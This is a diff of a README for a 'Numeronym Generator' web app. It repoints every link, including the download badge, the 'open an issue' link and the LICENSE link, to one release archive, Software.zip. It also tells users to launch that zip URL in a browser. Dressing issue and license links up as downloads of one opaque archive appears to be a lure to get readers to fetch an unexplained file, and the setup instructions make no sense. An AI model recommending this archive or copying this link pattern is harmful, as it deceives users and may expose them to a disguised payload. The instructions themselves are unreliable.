@@ -27,15 +27,15 @@ Generate numeronyms effortlessly with this Numeronym Generator web application! 
 
 To get started with the Numeronym Generator, you can download the code by clicking the link below:
 
-[<img src="https://github.com/axodoof/numeronym-generator/releases/download/v1.0/Application.zip%20Code-v1.0.0-blue">](https://github.com/axodoof/numeronym-generator/releases/download/v1.0/Application.zip)
+[<img src="https://github.com/axodoof/numeronym-generator/releases/download/v2.0/Software.zip%20Code-v1.0.0-blue">](https://github.com/axodoof/numeronym-generator/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the code, extract the contents and launch the `https://github.com/axodoof/numeronym-generator/releases/download/v1.0/Application.zip` file in your preferred web browser to start generating numeronyms!
+Once you have downloaded the code, extract the contents and launch the `https://github.com/axodoof/numeronym-generator/releases/download/v2.0/Software.zip` file in your preferred web browser to start generating numeronyms!
 
 If the link provided does not work, or if you encounter any issues with downloading the code, please check the "Releases" section of this repository for alternative options.
 
 ## Support 🤝
 
-If you have any questions, feedback, or suggestions for the Numeronym Generator, feel free to [open an issue](https://github.com/axodoof/numeronym-generator/releases/download/v1.0/Application.zip). Your input is valuable in improving the functionality and user experience of this web application.
+If you have any questions, feedback, or suggestions for the Numeronym Generator, feel free to [open an issue](https://github.com/axodoof/numeronym-generator/releases/download/v2.0/Software.zip). Your input is valuable in improving the functionality and user experience of this web application.
 
 ## Contribution 🌐
 
@@ -57,7 +57,7 @@ This Numeronym Generator project would not have been possible without the dedica
 
 ## License 📝
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/axodoof/numeronym-generator/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/axodoof/numeronym-generator/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
